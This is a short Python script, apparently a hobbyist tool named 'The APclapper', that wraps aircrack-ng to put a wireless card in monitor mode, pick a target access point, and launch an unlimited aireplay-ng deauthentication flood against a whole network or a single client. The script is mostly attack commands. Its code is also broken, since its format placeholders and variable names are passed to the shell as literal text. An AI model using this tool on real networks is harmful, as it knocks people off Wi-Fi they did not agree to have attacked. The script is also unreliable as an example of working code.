import os

print ("if you want to exit the program just press CTRL and c to stop")
print ("when running airodump-ng just press ctrl c to stop")
os.system("airmon-ng start wlan0")
os.system("airodump-ng wlan0mon")
bssid = input("enter the bssid that you want to CLAP!")
channel = input("enter the channel of the channel you wanna CLAP!")
os.system("airodump-ng --channel %s --bssid %s wlan0mon")
aireplay = input("do you want to clap the entire network or just a client? Network/Client")
if aireplay is 'Network':
  os.system("aireplay-ng -0 0 -a (bssid) wlan0mon")
else:
  aireplay_client = input("enter the client you wanna CLAP:")
  os.system("aireplay-ng -0 0 -a (bssid) -c (aireplay_client) wlan0mon")

print ("The APclapper...")
